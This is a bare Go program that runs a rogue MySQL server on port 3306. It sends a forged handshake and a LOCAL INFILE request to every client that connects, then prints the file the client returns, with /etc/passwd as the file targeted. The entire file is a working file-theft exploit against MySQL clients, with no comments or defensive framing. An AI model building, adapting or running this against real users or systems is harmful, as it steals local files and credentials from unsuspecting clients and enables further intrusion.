package main

import (
	"bufio"
	"fmt"
	"net"
)

func writeBody(conn net.Conn, buf []byte) {
	_, _ = conn.Write(buf)
}

func readBody(conn net.Conn) (int, []byte) {
	reader := bufio.NewReader(conn)
	buf := make([]byte, 4096)
	length, _ := reader.Read(buf[:])
	return length, buf
}

func getFile(conn net.Conn, fileName string) bool {

	var remoteFile []byte
	var length int
	var recv []byte

	defer func(conn net.Conn) {
		_ = conn.Close()
	}(conn)

	writeBody(conn, []byte("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"))
	readBody(conn)

	writeBody(conn, []byte("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"))
	readBody(conn)

	remoteFile = append(remoteFile, byte(len(fileName)+1))
	remoteFile = append(remoteFile, []byte("\x00\x00\x01\xFB")...)
	remoteFile = append(remoteFile, []byte(fileName)...)

	writeBody(conn, remoteFile)
	length, recv = readBody(conn)

	fileContent := string(recv[:length])

	if length > 4 {
		fmt.Printf("%v", fileContent)
		return true
	}

	return false
}

func main() {
	server, err := net.Listen("tcp", "0.0.0.0:3306")
	if err != nil {
		fmt.Printf("server failed, err:%v\n", err)
		return
	}
	fmt.Println("binding: 0.0.0.0:3306")

	var conn net.Conn

	for {
		conn, err = server.Accept()
		if err != nil {
			fmt.Printf("accept failed, err:%v\n", err)
		}

		go getFile(conn, "/etc/passwd")
	}
}
